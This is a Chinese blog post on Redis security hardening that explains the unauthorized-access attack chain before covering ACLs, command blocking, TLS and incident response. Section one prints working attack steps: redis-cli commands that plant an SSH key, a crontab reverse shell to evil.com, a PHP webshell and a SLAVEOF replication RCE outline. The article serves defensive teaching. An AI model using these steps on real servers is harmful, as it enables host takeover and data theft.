---
title: 【Redis 安全】Redis 安全加固深度实战：ACL 权限体系、未授权访问攻击链与 TLS 落地
date: 2026-09-16 08:00:00
tags:
  - Redis
  - 安全
  - ACL
  - 运维
categories:
  - Redis
  - 安全
author: 东哥
---

# 【Redis 安全】Redis 安全加固深度实战：ACL 权限体系、未授权访问攻击链与 TLS 落地

## 面试官：一个只暴露了 6379 端口、没有密码的 Redis，攻击者能做什么？

很多人第一反应是："Redis 只是缓存，里面没敏感数据，最坏就是被清库。"

这是**极其危险的误判**。一个未授权访问的 Redis，在攻击者眼里不是"缓存"，而是一台**可以被利用来写文件、加载代码的远程命令执行入口**。

这篇文章我们把攻击链完整拆开（知道怎么被打，才知道怎么防），再落到 Redis 6+ 的 **ACL 权限体系**上，给出一套可以直接上生产的加固方案。

---

## 一、先看攻击链：未授权 Redis 是怎么被打穿的

前提条件只有一个：**6379 可访问 + 无认证**（或弱密码）。

### 1.1 利用一：写 SSH 公钥（最经典）

```bash
redis-cli -h 10.0.0.5
127.0.0.1:6379> CONFIG SET dir /root/.ssh
127.0.0.1:6379> CONFIG SET dbfilename authorized_keys
127.0.0.1:6379> SET x "\n\nssh-rsa AAAAB3Nza... attacker@evil\n\n"
127.0.0.1:6379> SAVE
```

原理：Redis 的 RDB 持久化会把内存数据写进 `dir/dbfilename` 指定的文件。**通过 `CONFIG SET` 改写保存路径，就能在服务器上任意写文件**。写进免密登录的公钥后，攻击者直接 SSH 登录。

> 前提是 Redis 以 root 运行，或者目标路径对 Redis 进程可写——这也是为什么"用 root 跑 Redis"是红线。

### 1.2 利用二：写 crontab 反弹 Shell

把 `dir` 指向 `/var/spool/cron`、`dbfilename` 设为 `root`，写入内容包含：

```text
\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/evil.com/4444 0>&1\n\n
```

一分钟后 crontab 触发反弹 shell。

### 1.3 利用三：写 Webshell

`dir=/var/www/html`、`dbfilename=shell.php`，写入 `<?php system($_GET['c']); ?>`。

### 1.4 利用四：主从复制 RCE（最"高级"的一种）

```text
攻击者机器: 起一个恶意 Redis（master），准备好恶意 .so 模块
目标 Redis: SLAVEOF evil.com 6379
            目标与恶意 master 建立复制 → 全量同步 → 攻击者可控地写入恶意数据
            目标 MODULE LOAD ./exp.so → 执行任意命令
```

这条链说明：**光禁 `CONFIG` 不够**，`SLAVEOF`/`REPLICAOF`、`MODULE` 同样是高危险命令。

### 1.5 攻击者还会做的"善后"

- `FLUSHALL` 清空你的数据（很多勒索案例）；
- `KEYS *` 遍历数据，把业务 key/value 打包外传；
- 设置自己的密码（`CONFIG SET requirepass`）把你锁在门外；
- 写入持久化后门（定时任务、SSH key），即使你加固 Redis 也还在。

**结论：Redis 安全不是"数据敏感不敏感"的问题，而是"主机是否被控制"的问题。**

---

## 二、加固清单：从网络到进程

先把"纵深防御"的层次列清楚，再深入 ACL 这个重点。

| 层次 | 措施 | 优先级 |
| --- | --- | --- |
| 网络 | 只监听内网 `bind 10.0.0.11 127.0.0.1`；安全组/防火墙只放行应用机 | ★★★★★ |
| 进程 | `protected-mode yes`；**用 redis 专用非 root 用户运行**；独立 systemd 用户 | ★★★★★ |
| 认证 | `requirepass` 或 ACL 用户密码；密码随机且足够长（`ACL GENPASS 256`） | ★★★★★ |
| 权限 | **ACL 最小权限**：应用账号只读需要的 key 前缀、只允许必要命令 | ★★★★★ |
| 危险命令 | 用 ACL 禁用 `CONFIG`/`MODULE`/`DEBUG`/`SLAVEOF`/`FLUSHALL`/`KEYS`/`SHUTDOWN` | ★★★★ |
| 传输 | TLS 加密（跨机房/合规场景必做） | ★★★ |
| 审计 | `ACL LOG` 记录越权/认证失败；日志外送 SIEM | ★★★ |
| 巡检 | 定期扫描暴露面（内网 + 公网）、检查 `MODULE LIST`、`CONFIG GET dir` | ★★★ |

> 特别提醒：`protected-mode` **只在"没有 bind 任何地址 + 没有配置密码"时才生效**。也就是说，一旦你为别的原因配了 `requirepass`，protected-mode 就不再保护你——但此时至少已有密码。真正致命的是"bind 了 0.0.0.0 且无密码"。

---

## 三、ACL：Redis 6+ 的权限体系

`requirepass` 是"一把钥匙开整间房"，而 **ACL（Access Control List）** 是"按房间发钥匙"。Redis 6.0 引入 ACL，7.0 进一步增强（选择器与读写分离的 key 权限）。

### 3.1 用户模型的六要素

每个 ACL 用户由以下要素构成：

| 要素 | 语法 | 说明 |
| --- | --- | --- |
| 启用状态 | `on` / `off` | `off` 表示禁止登录 |
| 密码 | `>pwd` / `#hash` / `nopass` / `resetpass` | 支持多密码；`#hash` 用 SHA-256 |
| 可访问 Key | `~pattern` / `%R~p` / `%W~p` / `%RW~p` / `resetkeys` | `%R/%W` 是 7.0 的读写分离权限 |
| Pub/Sub 频道 | `&pattern` / `resetchannels` / `allchannels` | 控制频道订阅 |
| 命令权限 | `+cmd` / `-cmd` / `+@category` / `-@category` / `+cmd|first-arg` | 支持按命令、按类别、按子命令 |
| 选择器（7.0） | `( ... )` | 一条规则里组合"命令+key+channel" |

**关键规则：ACL 规则按书写顺序从左到右生效，后面的覆盖前面的。** 所以"白名单"必须这么写：

```bash
ACL SETUSER app-cache on >s3cr3t-pwd ~cache:app:* -@all +get +set +del +expire +ttl
```

先 `-@all` 清空所有命令权限，再逐个授权。反过来写（先 `+@all` 后 `-@all`）就是全禁。

### 3.2 常用管理命令

```bash
# 列出当前用户 / 切换视角
ACL WHOAMI
ACL LIST
ACL USERS
ACL GETUSER app-cache          # 查看某用户的完整权限（排障必备）

# 创建/修改用户
ACL SETUSER app-cache on >pwd ~cache:app:* +get +set
ACL DELUSER app-cache

# 生成随机密码
ACL GENPASS 256                # 输出 64 个十六进制字符

# 查看命令分类，便于按类授权
ACL CAT                        # 列出所有类别
ACL CAT readonly               # 查看 readonly 类别包含哪些命令
ACL CAT string

# 审计：谁在越权、谁在爆破
ACL LOG 20
ACL LOG RESET

# 持久化 / 重载
ACL SAVE
ACL LOAD
```

### 3.3 密码哈希：不要在配置里放明文

```bash
# 生成 SHA-256 哈希（双引号用于 shell 转义的 64 位十六进制）
ACL SETUSER app-cache #<sha256-of-password>
```

生产上推荐的落地方式是 **aclfile**，而不是把规则塞在 `redis.conf` 里：

```text
# /etc/redis/users.acl
user default off
user monitor on >SuperLongRandomPwd ~* +@all -@dangerous
user app-cache on #a1b2c3... ~cache:app:* %R~cache:app:readonly:* -@all +get +set +del +expire +ttl +mget
user readonly-user on #d4e5f6... ~cache:app:* %R~* -@all +get +mget +keys
```

```conf
# redis.conf
aclfile /etc/redis/users.acl
```

改完执行 `ACL LOAD` 热加载，不重启、不断连接。

> **`user default off`** 这一行极其重要：Redis 的 `default` 用户默认是 `on` 且权限极大。生产上**必须把 default 关掉**，或者至少给它设强密码，否则"我配了一堆 ACL 用户"就是自欺欺人——攻击者直接用 default 就行。

### 3.4 命令权限的三个粒度

**粒度一：按命令名**

```bash
+get -set
```

**粒度二：按命令类别（推荐，可维护性更好）**

```bash
+@read +@write -@admin -@dangerous
```

常见类别：`read`、`write`、`keyspace`、`string`、`list`、`set`、`sortedset`、`hash`、`bitmap`、`hyperloglog`、`geo`、`stream`、`pubsub`、`transaction`、`scripting`、`connection`、`admin`、`dangerous`、`fast`、`slow`、`blocking`。

**粒度三：按子命令 / 首参数（`+cmd|first-arg`）**

```bash
+config|get       # 只允许读配置，禁止 config set
+client|setname
+cluster|info
```

这是**给运维账号的正确姿势**：需要看配置但绝不能改。

### 3.5 读写分离的 Key 权限（7.0+）

```bash
# %R~ 只读，%W~ 只写，%RW~ 读写
ACL SETUSER read-only-job on >pwd %R~report:* -@all +get +mget +hgetall +scan
```

注意两个**必须知道的限制**：

1. `%R~` / `%W~` 的判定依赖命令声明的 key spec。**当 key 不是静态声明时（比如 `EVAL` 脚本内部访问的 key、部分动态 key 的命令），ACL 无法可靠约束**。
2. 因此 "只读用户" 不能等同于"绝对安全"：如果允许 `+eval`，脚本里仍可能写入别的 key。**不要把 `+@scripting` 给最小权限账号。**

### 3.6 ACL 选择器（7.0+）：一条规则表达复杂授权

选择器用括号把"命令 + key + channel"打包，避免用户被拆成好几个：

```bash
ACL SETUSER mixed on >pwd (~pub:* +publish) (~sub:* +subscribe +psubscribe) (~data:* +get +set)
```

这条用户既能发 `pub:*` 的消息，又能订阅 `sub:*`，还能读写 `data:*`，但**不能在错误的 key 上执行错误的命令**。这是 Redis 7 ACL 表达力提升最明显的地方。

### 3.7 Cluster 模式的注意点

- ACL 用户配置**需要逐节点生效**（不会通过主从复制自动同步）。推荐统一 aclfile + 配置管理工具（Ansible/配置中心）分发，然后各节点 `ACL LOAD`。
- 有 Proxy（如 Codis/Twemproxy/自研）时，**认证发生在 Proxy 层**，后端 Redis 的 ACL 要按"只信任 Proxy IP"来设计。

---

## 四、危险命令怎么治理

### 4.1 用 ACL 禁用（推荐）

```text
user app-cache on #...  ~cache:* -@all +@read +@write \
     -config -module -debug -shutdown -flushall -flushdb -keys -monitor \
     -slaveof -replicaof -migrate -save -bgsave -bgrewriteaof -swapdb -acl
```

需要重点拉黑的高危命令：

| 命令 | 危害 |
| --- | --- |
| `CONFIG SET` | 改保存路径写文件（写 SSH key / crontab / webshell 的核心） |
| `MODULE LOAD` | 加载任意 .so，执行系统命令 |
| `SLAVEOF` / `REPLICAOF` | 主从复制 RCE |
| `DEBUG` | 构造崩溃、内存耗尽 |
| `FLUSHALL` / `FLUSHDB` | 清库（勒索/破坏） |
| `KEYS` | 阻塞式全量扫描，也是攻击者的"踩点"命令 |
| `MONITOR` | 窃取所有命令（含业务数据） |
| `SHUTDOWN` | 拒绝服务 |
| `ACL SETUSER` | 给自己提权 |
| `MIGRATE` / `RESTORE` | 跨实例搬运数据、注入恶意序列化数据 |

### 4.2 `rename-command` 还有用吗？

```conf
rename-command CONFIG ""
rename-command FLUSHALL ""
```

把命令改成空串等于禁用，改成随机字符串等于"隐形式禁用"。

但要注意：

- 官方已明确**建议用 ACL 取代 `rename-command`**（该方法属于历史遗留的兼容手段，在新版本中逐步弱化）；
- 改名会**破坏依赖固定命令名的工具链**（监控脚本、`redis-cli --bigkeys`、部分客户端的管理命令）；
- 改名后**攻击者仍可通过 `ACL CAT` 等途径探测**，只是提高了门槛。

**结论：新项目直接用 ACL，`rename-command` 只作为存量集群的过渡手段。**

---

## 五、传输层：TLS 加密

跨机房复制、合规审计、多租户场景下，明文传输是不可接受的。

```conf
# redis.conf
port 0                     # 关闭明文端口（或用不同端口并存）
tls-port 6379

tls-cert-file /etc/redis/tls/redis.crt
tls-key-file  /etc/redis/tls/redis.key
tls-ca-cert-file /etc/redis/tls/ca.crt
tls-auth-clients yes       # 强制双向认证（mTLS）
tls-protocols "TLSv1.2 TLSv1.3"
tls-ciphersuites TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256
```

客户端侧（Spring Boot + Lettuce）：

```yaml
spring:
  data:
    redis:
      host: redis.internal
      port: 6379
      username: app-cache          # ACL 用户名
      password: ${REDIS_PASSWORD}  # 从环境变量/密钥管理注入
      ssl:
        enabled: true
```

> **密码绝不写进代码仓库**。用环境变量、K8s Secret 或配置中心加密配置（如 Jasypt）注入。

一个常见的性能顾虑：TLS 会引入额外 CPU 开销与握手延迟。但 Redis 的瓶颈通常在网络往返，**开启 TLS 后的吞吐下降一般在 10% 以内**，对绝大多数业务完全可接受——比"被拖库"的代价低得多。

---

## 六、审计与应急响应

### 6.1 用 ACL LOG 做审计

`ACL LOG` 会记录**认证失败**与**越权访问**，字段包括：

```json
{
  "count": 3,
  "reason": "command",        // auth | command | key | channel
  "context": "toplevel",
  "object": "config|set",
  "username": "app-cache",
  "age-seconds": "12.4",
  "client-info": "id=123 addr=10.0.1.7:53211 ..."
}
```

- `reason: auth` 大量出现 → **密码爆破**；
- `reason: command` 出现 `config|set`、`module|load` → **正在被攻击**；
- `reason: key` → 业务越权访问（可能是代码 bug，也可能是横向移动）。

建议把 Redis 日志（含 ACL LOG 导出）接入 SIEM 并配置告警。

### 6.2 已被入侵时的应急动作

```bash
# 1) 立刻断网/加防火墙（保留现场，但先止血）
# 2) 检查是否被写了后门
cat /root/.ssh/authorized_keys
crontab -l; cat /var/spool/cron/root
ls -la /var/www/html
# 3) 检查是否加载了恶意模块
redis-cli -a <pwd> MODULE LIST
# 4) 检查保存路径是否被改
redis-cli -a <pwd> CONFIG GET dir dbfilename
# 5) 检查慢日志与命令统计
redis-cli -a <pwd> SLOWLOG GET 100
redis-cli -a <pwd> INFO commandstats
# 6) 全量重置：轮换所有密码、清理后门、必要时重装节点
```

**注意**：排查时不要再连 `redis-cli` 到公网暴露实例上执行 `> CONFIG` 之类的操作，也不要随意 `FLUSHALL` 破坏证据。

---

## 七、面试常见追问

**Q1：`requirepass` 和 ACL 的关系是什么？**

`requirepass` 本质上就是给 `default` 用户设密码。ACL 是它的超集：既能设密码，也能限制 key、命令、频道。生产上应**关闭 default 用户**，为每个应用/角色建独立 ACL 用户——这样才能做到"一个应用泄露不影响其他应用"。

**Q2：ACL 能完全防住 Lua 脚本逃逸吗？**

不能。ACL 限制的是"客户端能调的命令与 key"，而 `EVAL` 脚本内部的 key 访问在部分场景下无法被 key 权限精确校验。防线是：**不给最小权限账号 `+eval`**，同时用 `lua-time-limit` 防御死循环。

**Q3：为什么"Redis 里没敏感数据"这个理由不成立？**

因为写 SSH key / crontab / webshell 攻击链利用的是**文件写入能力**，与数据本身无关。Redis 在这种情况下扮演的是"远程文件写入器"和"代码加载器"，最终目标是拿到服务器控制权。

**Q4：集群里 ACL 怎么管？**

逐个节点配置（推荐统一 aclfile + 自动化分发 + `ACL LOAD`）。注意 `ACL SETUSER` 的运行时变更不会通过复制传播，只改一个节点会造成"权限不一致"的诡异故障。

**Q5：TLS 会不会严重拖慢 Redis？**

不会。开销主要在握手与加解密，吞吐下降通常在 10% 以内。真正的性能问题是"网络往返"与"大 key"，加密不是瓶颈。Redis Cluster 与主从复制的 `tls-replication` 也需要显式开启。

---

## 八、小结

| 要点 | 结论 |
| --- | --- |
| 攻击本质 | 未授权 → 文件写入 / 代码加载 → 主机沦陷（不是"数据泄露"这么轻） |
| 第一优先级 | 内网 bind + 非 root 运行 + 强认证，三者缺一不可 |
| 权限模型 | ACL（6.0+），7.0+ 支持选择器与 `%R/%W` 读写分离 key 权限 |
| 必须做的三件事 | `user default off`、应用账号最小权限、拉黑 `CONFIG`/`MODULE`/`REPLICAOF` |
| 持久化方式 | aclfile + `ACL LOAD`，密码存 SHA-256 哈希，不落明文 |
| 传输 | TLS + mTLS，密码走密钥管理而非代码 |
| 审计 | `ACL LOG` 监控 auth/command/key 越权，接 SIEM 告警 |
| 高频误区 | protected-mode 能兜底（不能）、`rename-command` 是终极方案（不是）、集群改一个节点即可（不行） |

Redis 安全加固的性价比极高：**90% 的入侵事件都能被"bind 内网 + 关闭 default 用户 + 最小权限 ACL"这三条挡住**。真正难的从来不是技术手段，而是把这些当成默认规范，而不是"等出事再说"。
